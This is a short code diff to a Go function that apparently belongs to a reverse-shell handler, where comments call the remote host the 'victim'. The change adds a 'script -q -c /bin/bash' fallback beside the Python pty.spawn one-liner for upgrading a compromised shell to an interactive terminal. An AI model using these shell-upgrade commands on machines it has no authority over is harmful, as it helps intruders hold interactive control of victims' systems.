@@ -587,13 +587,16 @@ func (c *TCPClient) EstablishPTY() error {
 
 	python := c.SelectPython()
 	if python == "" {
-		return errors.New("fully interactive PTY require Python on the current client")
+		// Step 1: Spawn /bin/sh via pty of victim
+		command := "script -q -c /bin/bash /dev/null"
+		log.Info("spawning /bin/bash on the current client by script command")
+		c.System(command)
+	} else {
+		// Step 1: Spawn /bin/sh via pty of victim
+		command := "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+		log.Info("spawning /bin/bash on the current client by python command")
+		c.System(command)
 	}
-
-	// Step 1: Spawn /bin/sh via pty of victim
-	command := "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
-	log.Info("spawning /bin/bash on the current client")
-	c.System(command)
 
 	// TODO: Check whether pty is established
 	c.ptyEstablished = true
